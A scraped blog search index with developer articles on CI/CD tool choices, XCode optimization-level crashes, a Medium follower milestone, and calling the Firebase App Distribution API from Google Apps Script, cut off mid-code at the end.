in other fields (such as Web, backend, Java, etc.), with the most plugins available and the best usability. It allows for a unified CI/CD service that all teams can use for easier management, or for complex CI/CD scenarios like automatically deploying the frontend after backend deployment. *GitHub Actions later also supported cross-repo Actions/Runners.Richness of Third-Party Plugins Jenkins &gt; GitHub ActionsIn terms of quantity, GitHub Actions surpasses Jenkins, but Jenkins offers deeper and more powerful CI/CD functionalities, while many GitHub Actions features are merely automation functions.Depth of Functionality Jenkins »&gt; GitHub ActionsThis is not comparable; Jenkins has been around for nearly 20 years, while GitHub Actions still has many features to catch up on, such as permission management, secret management (currently limited to plain text; key files must be converted to plain text), and cache/artifact support (currently only for the cloud), among others.In terms of expansion, GitHub Self-hosted Runner also supports Docker or k8s .Customization Depth Jenkins »&gt; GitHub ActionsJenkins allows for complete control over customization, with greater permissions that can affect the entire system. GitHub Actions can only customize different steps at the application layer.For example, the built-in artifacts in GitHub Actions do not support self-hosted, so you can only change the step to sh copy to another directory, without the ability to customize artifacts implementation. *App CI/CD scenarios do not require overly complex functionalities.Usability GitHub Actions »&gt; JenkinsIn terms of interface, GitHub Actions is a newer tool that is easier to use than Jenkins; in terms of script settings, Jenkins uses Pipeline Script stored on Jenkins, while GitHub Actions uses YAML files managed with Git, making it easier to set up than Jenkins.Cost Risk Jenkins &gt; GitHub ActionsJenkins is fully open-source and free, giving you complete control. GitHub Actions is partially open-source, but task dispatch and execution are part of GitHub’s closed SaaS service. Currently, the policy is that GitHub Actions is completely free, but using GitHub Runner incurs costs (for private repos), while using self-hosted runners is free.Purpose of Google Apps Script Web App and Why It Was ChosenAnother tool choice is Google Apps Script Web App. The reason for needing this is that the form functionality provided by GitHub Actions is too basic (the interface is too engineering-focused and only static), and the execution permissions are tied to the GitHub Repo, making it very cumbersome if we need to provide it for other functional partners.As follows:For CD packaging, we would like the operator to fill in some information, such as Release Notes.Thus, we need a “interface” tool to provide for other partners or even for our engineers to use more conveniently.Required Scenario: Fill in the necessary information on this more user-friendly “interface,” connect to project management tools (e.g., Jira, Asana) to retrieve tasks or directly get the PR list from GitHub, select from a dropdown menu, and submit, then trigger GitHub Actions for packaging via the GitHub API.SlackWhen we first introduced CI/CD, we chose to integrate the Slack API to achieve effects similar to the following:https://slack.com/intl/zh-tw/blog/productivity/workflow-builder-tools-automation-examples Partners can directly fill out forms in Slack, trigger CD packaging, and receive Slack notifications.The operation was smooth and unified within daily office tools (SSOT), requiring no retraining. However, the underlying issue is that the development and maintenance costs are extremely high, one reason being that the Slack Outgoing-Webhook API has very high response requirements (it needs to respond within 3 seconds), effectively ruling out the use of FAAS services for simple integration (e.g., Cloud Functions, GAS, Lambda…).Previously, one partner who was very interested in automation and backend developed a complete backend service using Kotlin+ktor, and then set up a server on GCP for Slack integration. The development and maintenance costs are extremely high and difficult to hand over.Google Apps Script — Web AppI previously shared “Using Google Apps Script Web App Forms to Integrate GitHub Action CI/CD Work”:Demo Web App Form URLThe advantages of using Google Apps Script — Web App are: Web-based Permission management with Google Workspace enterprise accounts, allowing access only to Google accounts within the organization Completely free Function as a Service without the need to set up and maintain servers Easier to maintain and hand over Usable on mobile devices AI Can Help! Whether it’s ChatGPT or other AI tools, they are very familiar with GAS and can directly assist us in creating packaging forms and integrating with the GitHub API. Can also integrate with Jira, Asana, and Slack notification APIs.For the second promotion, I switched to using GAS Web App for partners, which received very positive feedback. The only difference from Slack is that you need to bookmark one more URL and open it to operate the packaging from the web form when needed.Complete Tool Workflow for App CI/CDHere’s the complete workflow. The next article will gradually introduce how to use and integrate each tool.Tool Roles: GitHub Actions: CI/CD logic script code GitHub Actions — Self-hosted Runner: The actual execution location for CI/CD, using a self-hosted Runner to execute tasks without limits on usage, only incurring the cost of purchasing the machine. Google Apps Script Web App: Since packaging may not always be the responsibility of engineers, a platform is needed for cross-functional partners to use; GAS Web App can quickly create a web tool and share the URL for others to operate. Asana/Jira: Project management tools that can integrate with GAS Web App, allowing QA/PM to directly select tasks to be packaged. Slack: Responsible for receiving execution result notifications.Scenarios: End-User (QA/PM/PD/Developer): Uses GAS Web App to submit the packaging form (fetching the corresponding branch for Jira or Asana task) -&gt; GAS calls GitHub API -&gt; triggers CD packaging in GitHub Actions &lt;- GitHub self-hosted runner listens for the task and pulls it back to the machine for execution -&gt; Upon completion, Slack notifies and updates the GAS Web App packaging status. End-User (Developer): Opens PR, pushes new commits to PR -&gt; triggers CI testing process &lt;- GitHub self-hosted runner listens for the task and pulls it back to the machine for execution -&gt; Upon completion, comments on test results and updates checks.ConclusionThis article primarily aims to give you a preliminary understanding of what CI/CD is and the benefits it brings. The next article will delve into the technical aspects, guiding you step-by-step to understand and implement GitHub Actions CI/CD to achieve the final results discussed earlier.Series Articles: CI/CD Practical Guide (1): What is CI/CD? How to Build a Stable and Efficient Development Team Through CI/CD? Tool Selection? CI/CD Practical Guide (2): Comprehensive Use and Setup of GitHub Actions and Self-hosted Runners CI/CD Practical Guide (3): Implementing CI and CD Workflows for App Projects Using GitHub Actions CI/CD Practical Guide (4): Using Google Apps Script Web App to Integrate GitHub Actions to Build a Free and User-Friendly Packaging Tool PlatformBuy me a coffee This series of articles has taken a significant amount of time and effort to write. If the content has been helpful to you and has significantly improved your team’s work efficiency and product quality, feel free to buy me a coffee. Thank you for your support!Buy me a coffeeIf you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 637 Total Views Last Statistics Date: 2025-08-15 | 612 Views on Medium." }, { "title": "通靈筆記 XCode 升級時最好測一下的事…", "url": "/posts/zrealm-dev/%E9%80%9A%E9%9D%88%E7%AD%86%E8%A8%98-xcode-%E5%8D%87%E7%B4%9A%E6%99%82%E6%9C%80%E5%A5%BD%E6%B8%AC%E4%B8%80%E4%B8%8B%E7%9A%84%E4%BA%8B-7508328d8b8d/", "categories": "ZRealm Dev.", "tags": "ios-app-development, xcode, build-settings, swift, troubleshooting", "date": "2025-04-11 22:50:31 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[通靈筆記] XCode 升級時最好測一下的事…遇到僅在 Build Configuration Release (正式版、線上版)才會出現的幽靈閃退或程式邏輯問題，但是 Debug 安然無恙。Photo by Tommaso...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[通靈筆記] XCode 升級時最好測一下的事…遇到僅在 Build Configuration Release (正式版、線上版)才會出現的幽靈閃退或程式邏輯問題，但是 Debug 安然無恙。Photo by Tommaso PecchioliTL;DR使用新 XCode 打包發佈專案之前，除了直接 Build &amp; Run 玩玩看有沒有跑版或異常， 請記得也試試看 ： App Target 選擇 Build Settings 搜尋 Optimization Level 找到 Optimization Level 區塊 將 Debug 環境也設定同 Release 的值 (e.g. Fastest, Smallest [-Os] ) Build &amp; Run 測看看有沒有異常不選擇直接打包上 Testflight 測試是為了方便我們遇到問題的時候，能即時用斷點找到問題根源。 如果遇到使用者在 Release (正式版、線上版) 回報的問題(閃退或行為異常)，但開發者無法在本地復現，也可以試試改這個設定在本地試試看。可能出現的問題 程式上看正確，但結果異常 程式上看不會閃退的地方，卻會閃退以上在 Debug 環境 Optimization Level = None [-O0] 都是正常的，只會出現在 Optimization Level = Fastest, Smallest [-Os] 也就是 Release 的設定值。解法有問題的話，問題多半跟開發者無關 ；是 XCode 優化的 Bug 導致，若一定要用這版 XCode 打包那只能先自己調整程式 Workaround，等待新版 XCode 出來再測看看是否正常。 不建議直接把 Release 改成 None，因為可能會有更多其他問題。説故事時間以下是這幾年工作中實際被這坑坑過的問題場景。故事 1 — App 一直跳邀請評價 App Popup我們的 App 之前有一個功能是打開 App 時會「邀請使用者去應用商城給評價」規則是跳三次之後就不會在跳；但是收到很多使用者回報每次開 App 都會跳，持續很久了，一直問一直問很煩。但是我們從 Code 上看跟在本地 Build &amp; Run 在模擬器或實機上都沒問題，也試過各種 edge case 場景都無法復現；我甚至撰寫了一個 UI Test 瘋狂重跑路徑、清除資料重試…跑了幾千次都沒遇到問題。記得那次我苦惱到半夜三點多，萬念俱灰實在想不到是什麼問題，開始漫無目的的查看專案設定，突然靈機一動想說那把 Build Settings 都改成 Release 的值試試看好了，這才發現問題在 Optimization Level = Fastest, Smallest [-Os] 能重現，也因此才定位到出問題的位置。Pseudocodevar invitedTimes = 0 // Loaded from UserDefaults; will be saved back after updatefunc requestAppStoreReviewIfNeeded() { defer { invitedTimes += 1 // Works for now, but may have unintended side effects } guard invitedTimes &lt; 3 else { return } self.present(AppStoreReviewRequestAlert())} 這段程式是前人開發的，從程式上看這段程式碼雖然有 side effect，可是邏輯無問題、可以正常 Compile、在執行上之前的版本也都沒有問題。但當我把 Optimization Level = Fastest, Smallest [-Os] 之後下斷點 Print 值就發現異常了， invitedTimes += 1 之後會直接爆炸變成 -24760045646797946 一個極大的負數，也因此使用者每次都會跳邀請評價。當時先直接改掉這邊 defer 的寫法，就再也沒有使用者回報類似的問題了；後來回頭測試後續的 XCode 版本，相同的寫法、 Optimization Level = Fastest, Smallest [-Os] 也能正常運作了。故事 2 — 某個頁面會直接閃退Release (Testflight) 版在內測的時候發現有一個頁面(WebView) 只要一點擊就會閃退，可是工程師怎麼 Build &amp; Run 在模擬器或實機上都沒問題；每每猜測一個問題點就打包一個埋 Log 或是嘗試修正的版本上 Testflight 測試，非常痛苦費時；這時又喚起我上次被支配的恐懼，立刻請同事把本地的設定改成 Optimization Level = Fastest, Smallest [-Os] 然後在 Build &amp; Run 果然在本地復現了閃退的問題點。主要問題是出在我們自己特化的 WebView Obj-c Code 中有一個變數在 ptimization Level = Fastest, Smallest [-Os] 時會變 null，原因不明，只能先多加判斷保護；在之前版本也都正常，只能等新的 XCode 推出後再試試看是否正常。總結其實不只被這個坑坑了兩次，有些已經不記得了，總之就是留個心法： 使用新 XCode 版本第一次打包上版時，最好測一下這個 問題只發生在 Release (正式版、線上版)，基本上就是這個問題，可以直接改設定在本地看能不能復現有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 163 Total Views Last Statistics Date: 2025-08-15 | 111 Views on Medium." }, { "title": "Things to Test When Upgrading XCode", "url": "/posts/zrealm-dev/en/things-to-test-when-upgrading-xcode-7508328d8b8d/", "categories": "ZRealm Dev.", "tags": "ios-app-development, xcode, build-settings, swift, troubleshooting", "date": "2025-04-11 22:50:31 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Things to Test] When Upgrading XCodeEncountering ghost crashes or logical issues th...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Things to Test] When Upgrading XCodeEncountering ghost crashes or logical issues that only appear in Build Configuration Release (production version) but not in Debug.Photo by Tommaso PecchioliTL;DRBefore packaging and releasing your project with the new XCode, in addition to directly using Build &amp; Run to check for layout issues or anomalies, please remember to also try: App Target Select Build Settings Search for Optimization Level Locate the Optimization Level section Set the Debug environment to the same value as Release (e.g. Fastest, Smallest [-Os] ) Build &amp; Run to see if there are any anomaliesNot choosing to directly package and upload to TestFlight for testing is to facilitate finding the root cause of issues immediately using breakpoints when they arise. If you encounter issues reported by users in Release (production version), but developers cannot reproduce them locally, you can also try changing this setting locally to see if it helps.Possible Issues The program appears correct, but the results are abnormal Areas that should not crash the program do crashAll of the above are normal in the Debug environment with Optimization Level = None [-O0], and only occur with Optimization Level = Fastest, Smallest [-Os], which is the setting for Release.SolutionIf there are issues, they are mostly unrelated to the developer; they are caused by a bug in XCode’s optimization. If you must use this version of XCode for packaging, you can only adjust the program as a workaround and wait for a new version of XCode to see if it works correctly. It is not recommended to change Release to None directly, as it may cause more issues.Story TimeHere are some real scenarios from my work over the years where I encountered these pitfalls.Story 1 — App Keeps Prompting Users to Rate the AppOur app previously had a feature that would “invite users to rate the app in the app store” when opened, with the rule that it would stop prompting after three times. However, we received many reports from users that they were prompted every time they opened the app, which became quite annoying.From the code, we saw no issues, and it worked fine when we built and ran it on the simulator or real devices. We tried various edge cases but could not reproduce the problem; I even wrote a UI Test that repeatedly ran the path and cleared data to retry… after running it thousands of times, I still encountered no issues.I remember being so frustrated at around 3 AM, feeling hopeless and unable to figure out the problem. I started aimlessly checking project settings and suddenly had a lightbulb moment to change all Build Settings to the Release values to see what would happen. That’s when I discovered the issue could be reproduced with Optimization Level = Fastest, Smallest [-Os], which helped me pinpoint the problem.Pseudocodevar invitedTimes = 0 // Loaded from UserDefaults; will be saved back after updatefunc requestAppStoreReviewIfNeeded() { defer { invitedTimes += 1 // Works for now, but may have unintended side effects } guard invitedTimes &lt; 3 else { return } self.present(AppStoreReviewRequestAlert())} This piece of code was developed by someone else. Although it has a side effect, the logic seems fine, it compiles correctly, and previous versions executed without issues.However, when I set Optimization Level = Fastest, Smallest [-Os] and set a breakpoint to print the value, I found an anomaly: after invitedTimes += 1, it exploded to -24760045646797946, a huge negative number, causing users to be prompted for a rating every time.I first changed the defer implementation here, and we never received similar reports from users again. Later, I tested subsequent XCode versions, and the same implementation with Optimization Level = Fastest, Smallest [-Os] worked correctly.Story 2 — A Page Crashes ImmediatelyDuring internal testing of the Release (TestFlight) version, we found that one page (WebView) would crash as soon as it was clicked, but engineers had no issues when building and running it on the simulator or real devices. Each time we guessed a potential issue, we would package a version with logs or attempted fixes for TestFlight testing, which was very painful and time-consuming. This reminded me of the fear I experienced last time, so I immediately asked a colleague to change the local settings to Optimization Level = Fastest, Smallest [-Os], and sure enough, we reproduced the crash locally.The main issue was that in our custom WebView Obj-C code, a variable would become null when Optimization Level = Fastest, Smallest [-Os], for reasons unknown. We could only add additional checks for protection; it had worked fine in previous versions, and we would have to wait for a new XCode release to see if it worked correctly.ConclusionActually, I have been caught in this trap more than twice, and I’ve forgotten some of them. In any case, here are some takeaways: When packaging for the first time with a new XCode version, it’s best to test this. If issues only occur in Release (production version), it’s likely this problem; you can directly change the settings locally to see if you can reproduce it.If you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 163 Total Views Last Statistics Date: 2025-08-15 | 111 Views on Medium." }, { "title": "A Milestone of 1,000 Followers On Medium", "url": "/posts/zrealm-dev/a-milestone-of-1-000-followers-on-medium-6fd11e9704f2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, medium, writer, followers, milestones", "date": "2025-04-03 20:51:56 +0800", "snippet": "A Milestone of 1,000 Followers On Medium經營 Medium 七年，終於達成 1,000 追蹤者里程碑！ English version down below.經營 Medium 7 年、累積 112 篇文章、約 13 萬字，投入超過 800 小時，終於在 2025 年 4 月 2 日達成了夢想中的目標 — — 1,000 Followers。說來話長...", "content": "A Milestone of 1,000 Followers On Medium經營 Medium 七年，終於達成 1,000 追蹤者里程碑！ English version down below.經營 Medium 7 年、累積 112 篇文章、約 13 萬字，投入超過 800 小時，終於在 2025 年 4 月 2 日達成了夢想中的目標 — — 1,000 Followers。說來話長，從 2018 年開始，自己從 Web 轉戰 App 開發，一切對我來說都充滿新鮮感，總是抱著求知若渴的心態，不斷自行查閱資料，邊學邊做，最終完成並上架了自己的第一個 App 作品。由於完全自學，當時從許多前輩們留下的網路文章中獲益良多，也因此萌生了撰寫文章「教學相長」的念頭，希望自己也能創造出一個良善的循環。一開始，也曾陷入「分享迷思」，總擔心內容不夠完整、擔心被人挑惕，更怕對讀者毫無幫助。但後來轉念一想，寫文章就像是在種下一顆種子，總有一天，一位遇到類似問題的開發者能從我的文章中得到幫助，或者藉此進一步深入探索。即使寫的內容不一定會被看見，但若不開始，這些美好的可能性就無法發生，也因為這樣不斷地堅持寫作，才逐漸提升了自己的能力，讓文章內容更加豐富，更有機會幫助到他人。那段期間正好搭上時代的順風車，App 與軟體工程蓬勃發展。日常持續學習、開發新功能，並且將自己的經驗轉化為文章不斷分享出去；同時，也有源源不絕的新鮮人加入開發行列，因此每次發文總能獲得新的追蹤者。近幾年，隨著產業降溫、AI 對數位內容創作領域的衝擊，以及 Medium SEO 政策的變化，新追蹤人數的增長明顯放緩；對於達成「1K 目標」開始抱持佛系心態，但內心依舊保有最初的分享精神，繼續堅持記錄並協助遇到相似問題的朋友。此外也開始分享一些日常生活、旅行遊記、開箱文，以及個人興趣的自動化（RPA）相關內容。1K 只是個里程碑，未來還請大家多多指教。不論之後是否繼續撰寫 iOS 開發內容，都會持續分享自己所經歷的問題和所學到的經驗。由衷感謝大家這 7 年來的支持與陪伴！Harry, 2025/04/02.EnglishAfter seven years on Medium, publishing 112 articles, approximately 130,000 words, and investing over 800 hours, I finally reached my long-awaited milestone of 1,000 followers on April 2, 2025.It’s been quite a journey. Back in 2018, when I switched my focus from web development to app development, everything felt new and exciting. With an insatiable curiosity, I constantly searched for resources, learned by doing, and eventually completed and published my first app.As someone entirely self-taught, I gained a tremendous amount from online articles shared by many seasoned developers. This inspired me to begin writing myself, driven by the idea of “learning by teaching,” hoping to foster a positive cycle of knowledge-sharing.Initially, I was caught up in doubts about sharing — always concerned whether my content was thorough enough, whether I’d be criticized, or even worse, whether it provided no real value to readers.Eventually, I shifted my mindset. Writing is like planting a seed — someday, a developer encountering a similar problem might find help or inspiration through my posts. Even if my articles weren’t immediately seen, if I never started writing, those possibilities would never materialize. With continuous writing and persistence, I gradually improved my skills, enriching my content and increasing its potential to benefit others.Fortunately, I rode the wave of rapid growth in apps and software engineering. Day after day, I learned, built new features, and shared my experiences through writing. There was also a steady influx of new developers entering the field, and each article brought new followers.In recent years, growth has notably slowed, impacted by industry cooling, AI-driven changes to digital content creation, and shifts in Medium’s SEO policies. Gradually, I adopted a more relaxed approach towards reaching the 1,000-follower mark. Yet, I never lost the initial passion for sharing and continued documenting my experiences to help those encountering similar issues. Additionally, I started sharing daily life stories, travel experiences, product reviews, and content about my personal interest in automation (RPA) .Reaching 1,000 followers is just a milestone, and I look forward to your continued support in the future. Regardless of whether I continue writing about iOS development, I’ll keep sharing the problems I encounter and the knowledge I gain.I sincerely thank everyone for your support and companionship over these past seven years!Harry, 2025/04/02.有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 22 Total Views Last Statistics Date: 2025-08-15 | 19 Views on Medium." }, { "title": "Google Apps Script x Google APIs 快速串接整合方式", "url": "/posts/zrealm-robotic-process-automation/google-apps-script-x-google-apis-%E5%BF%AB%E9%80%9F%E4%B8%B2%E6%8E%A5%E6%95%B4%E5%90%88%E6%96%B9%E5%BC%8F-71400d408dc8/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, firebase-app-distribution, google-apps-script, google-api, google-cloud-platform", "date": "2025-03-20 22:12:48 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Google Apps Script x Google APIs 快速串接整合方式以 Google Apps Script x Firebase App Distribution API 串接為例背景之前寫了之前寫了好幾篇關於...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Google Apps Script x Google APIs 快速串接整合方式以 Google Apps Script x Firebase App Distribution API 串接為例背景之前寫了之前寫了好幾篇關於使用 Google Apps Script 的文章，其中「 使用 Google Apps Script 實現每日數據報表 RPA 自動化 」、「 簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人 」介紹了如何使用 Google Apps Script 串接 Google Analytics 和 Google Sheet, Web App, Slack, Telegram… 快速建置可視化數據中台及通知服務；另外上個月發的文章「 使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作 」則是直接使用 Google Apps Script Web App 串接 Github API 作為 CI/CD GUI 表單服務；以上要馬是直接使用 Google Apps Script 內建的服務進行串接或是直接串接外部服務 (Slack, Github…) 都沒碰到需要串接 Google APIs 的場景。 這次在優化 CI/CD GUI 表單時希望打包內測版後能在 Web App 上直接顯示 Firebase Distribution 下載連結，這塊就只能串接 Google APIs 才能達成。Google Apps Script x Firebase App Distribution API v1如上圖，與以往串接 Google Analytics 有內建服務「AnalyticsData」不同，Firebase App Distribution 並沒有提供內建串接服務，所以要用進階方式進行串接。 本來以為要自行使用 Service Account 完成 Access Token 產生、交換（有點麻煩，可參考我之前的 評價機器人開源專案 ）， 但其實不用這麼麻煩。Google Apps Script x Google APIs 進階服務串接串接設定參考 官方文件描述 ，我們需要照以下步驟進行進階設定： 您必須在指令碼專案中 啟用進階服務 。 您必須確認在指令碼使用的 Cloud Platform (GCP) 專案 中，已啟用對應進階服務的 API。 如果指令碼專案使用的是 2019 年 4 月 8 日當天或之後建立的 預設 GCP 專案 ，您啟用進階服務並儲存指令碼專案後，API 就會自動啟用。如果您尚未同意，系統可能也會要求您同意《 Google Cloud 》和《 Google API 》服務條款。 如果指令碼專案使用 標準 GCP 專案 或較舊的預設 GCP 專案，您必須手動在 GCP 專案中 啟用進階服務的對應 API 。您必須具備 GCP 專案的編輯權限，才能進行這項變更。1. 專案設定 —設定關聯的 Google Cloud Platform (GCP) 專案Google Apps Script x Google APIs 進階服務串接會需要你建立 GCP 專案並關聯到 Google Apps Script，Google APIs 使用權限是依照 GCP 設定。因此你需要建立一個 GCP 專案(同 Firebase GCP 專案亦可)，記下資訊主頁的「 專案編號 」並確定這個 GCP 專案有啟用你想使用的 Google APIs 及當前登入帳號或欲使用的帳號是有該 GCP 專案、Google APIs 權限。 本文以「 Firebase App Distribution API 」為例。將 專案編號 輸入到 Goolge Apps Script 專案設定下方的 Google Cloud Platform 專案編號中，當前登入帳號有該 GCP 專案權限就能自動綁定設定成功。2. 專案設定 — 啟用 在編輯器中顯示「appsscript.json」資訊清單檔案啟用後回到編輯器，檔案列表就會出現「 appsscript.json 」設定檔：確保 oauthScopes 中包含以下兩個描述設定： \"oauthScopes\": [ \"https://www.googleapis.com/auth/script.external_request\", \"https://www.googleapis.com/auth/cloud-platform\" ]如果沒有請手動貼上儲存。3.撰寫串接程式碼設定好 GCP 專案之後我們就能開始撰寫串接程式碼，直接參考想串接的 Google APIs 官方文件， Firebase App Distribution API v1 ：const project = \"projects/[Firebase Project ID]/apps/[Firebase APP ID]\"; // 請換成你的 Project ID &amp; App IDfunction debug() { const releases = firebaseDistribution(\"\"); releases.forEach(function(release) { // Release Object: https://firebase.google.com/docs/reference/app-distribution/rest/v1/projects.apps.releases?hl=zh-tw#Release Logger.log(`${release.name} Download URL: ${release.testingUri}`); });}function firebaseDistribution(releaseNote) { const url = \"https://firebaseappdistribution.googleapis.com/v1/\"+project+\"/releases?filter=releaseNotes.text%3D*\"+releaseNote+\"*\"; // Filter: https://firebase.google.com/docs/reference/app-distribution/rest/v1/projects.apps.releases/list?hl=zh-tw const headers = { \"Content-Type\": \"application/json; charset=UTF-8\", \"Authorization\": \"Bearer \" + ScriptApp.getOAuthToken(), // 直接使用當前帳號換取權杖 }; const options = { \"method\": \"get\", \"headers\": headers }; const data = UrlFetchApp.fetch(url, options); const result = JSON.parse(data.getContentText()).releases; if (result == undefined) { return []; } return result;}[Firebase Project ID] 與 [Firebase APP ID] 可在 Firebase 專案設定中取得：貼上程式碼後，第一次執行需要完成權限授權。 點擊「審查權限」 選擇要執行的身份帳戶，通常等於當前 Google Apps Script 帳戶 選擇「進階」展開 -&gt; 點擊「前往 XXX」這是我們自己寫給自己用的應用程式，不需經過 Google 驗證。 點擊「允許」 以上畫面不一定會出現，沒有可忽略。允許之後再點「偵錯」或「執行」就能執行程式：如果出現錯誤：Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 403. Truncated server response: { \"error\": { \"code\": 403, \"message\": \"Request had insufficient authentication scopes.\", \"status\": \"PERMISSION_DENIED\", \"details\":... (use muteHttpExceptions option to examine full response)...或Exception: Specified permissions are not sufficient to call UrlFetchApp.fetch. Required permissions: https://www.googleapis.com/auth/script.external_request請確認 appsscript.json 的 oauthScopes 中包含以下兩個描述設定(參考步驟 2)：\"oauthScopes\": [ \"https://www.googleapis.com/auth/script.external_request\", \"https://www.googleapis.com/auth/cloud-platform\" ]如果出現錯誤：Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 401. Truncated server response: { \"error\": { \"code\": 401, \"message\": \"Request had invalid authentication credentials. Expected OAuth 2 access token, login cookie or othe... (use muteHttpExceptions option to examine full response)代表尚未設定綁定的 GCP 專案 (參考步驟 1. ) 或是該 GCP 專案尚未啟用欲使用的 Google APIs 或是當前帳號無該 GCP / Google APIs 使用權限或無該 Firebase App 權限，請檢查設定。如果出現錯誤：Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 404. Truncated server response:或Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 400. Truncated server response: { \"error\": { \"code\": 400, \"message\": \"Request contains an invalid argument.\", \"status\": \"INVALID_ARGUMENT\" }}請確認 Google APIs 請求路徑是否正確。串接成功🎉🎉🎉可以看到短短不到 10 行程式碼就能無痛串接 Google APIs，真的非常方；有興趣的朋友可以看一下相較之下， 自己實作 Google APIs 串接時身份驗證權杖交換的程式步驟，非常繁瑣。下一步：搭配之前的文章「 使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作 」串上 CI/CD 工作項目，將 Firebase App Distribution 下載連結也呈現在 Web App 上方便同仁直接在上面下載。Demo Result 其他 Google APIs 也能以此類推串接。2025/07 Update:此功能已整合到實際打包工具使用，可參考最新文章案例：「 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台 」有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 98 Total Views Last Statistics Date: 2025-08-15 | 87 Views on Medium." }, { "title": "Quick Integration Method for Google Apps Script x Google APIs", "url": "/posts/zrealm-robotic-process-automation/en/quick-integration-method-for-google-apps-script-x-google-apis-71400d408dc8/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, firebase-app-distribution, google-apps-script, google-api, google-cloud-platform", "date": "2025-03-20 22:12:48 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Quick Integration Method for Google Apps Script x Google APIsUsing Google Apps Scrip...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Quick Integration Method for Google Apps Script x Google APIsUsing Google Apps Script x Firebase App Distribution API as an exampleBackgroundPreviously, I wrote several articles about using Google Apps Script, including “Implementing Daily Data Report RPA Automation with Google Apps Script” and “Simple 3 Steps — Create a Free GA4 Automatic Data Notification Bot,” which introduced how to use Google Apps Script to connect Google Analytics and Google Sheets, Web Apps, Slack, Telegram, etc., to quickly build a visual data platform and notification service. Additionally, last month’s article “Using Google Apps Script Web App Forms to Connect to GitHub Action CI/CD” directly used Google Apps Script Web App to connect to the GitHub API as a CI/CD GUI form service. In all these cases, whether directly using the built-in services of Google Apps Script for integration or connecting to external services (Slack, GitHub, etc.), I hadn’t encountered a scenario that required connecting to Google APIs. This time, while optimizing the CI/CD GUI form, I wanted to display the Firebase Distribution download link directly on the Web App after packaging the internal test version, which could only be achieved by connecting to Google APIs.Google Apps Script x Firebase App Distribution API v1As shown in the image above, unlike the built-in service “AnalyticsData” for connecting to Google Analytics, Firebase App Distribution does not provide a built-in integration service, so we need to use an advanced method for integration. I initially thought I would have to generate and exchange the Access Token using a Service Account (which is a bit cumbersome; you can refer to my previous review bot open-source project), but it turns out it’s not that complicated.Advanced Service Integration of Google Apps Script x Google APIsIntegration SetupRefer to the official documentation for the following advanced setup steps: You must enable advanced services in your script project. You must ensure that the API for the corresponding advanced service is enabled in the Cloud Platform (GCP) project used by the script. If the script project uses a default GCP project created on or after April 8, 2019, the API will be automatically enabled after you enable advanced services and save the script project. If you have not agreed yet, the system may also prompt you to agree to the Google Cloud and Google API terms of service. If the script project uses a standard GCP project or an older default GCP project, you must manually enable the corresponding API for advanced services in the GCP project. You must have edit permissions for the GCP project to make this change.1. Project Setup — Associate with Google Cloud Platform (GCP) ProjectThe advanced service integration of Google Apps Script x Google APIs requires you to create a GCP project and associate it with Google Apps Script. The permissions for using Google APIs are based on the GCP settings.Therefore, you need to create a GCP project (the same Firebase GCP project is also acceptable), note the “ Project Number “ on the information homepage, and ensure that this GCP project has enabled the Google APIs you want to use and that the currently logged-in account or the account you wish to use has permissions for that GCP project and Google APIs. This article uses the “Firebase App Distribution API” as an example.Enter the Project Number into the Google Cloud Platform project number field at the bottom of the Google Apps Script project settings. If the currently logged-in account has permissions for that GCP project, it will automatically bind and set up successfully.2. Project Setup — Enable Display of “appsscript.json” Manifest File in the EditorAfter enabling, return to the editor, and the file list will show the “ appsscript.json “ configuration file:Ensure that the oauthScopes includes the following two configuration settings: \"oauthScopes\": [ \"https://www.googleapis.com/auth/script.external_request\", \"https://www.googleapis.com/auth/cloud-platform\" ]If not, please manually paste and save.3. Write Integration CodeAfter setting up the GCP project, we can start writing the integration code. Directly refer to the official documentation of the Google APIs you want to connect to, Firebase App Distribution API v1:const project = \"projects/[Firebase Project ID]/apps/[Firebase APP ID]\"; // Please replace with your Project ID &amp; App IDfunction debug() { const releases = firebaseDistribution(\"\"); releases.forEach(function(release) { // Release Object: https://firebase.google.com/docs/reference/app-distribution/rest/v1/projects.apps.releases?hl=zh-tw#Release Logger.log(`${release.name} Download URL: ${release.testingUri}`); });}function 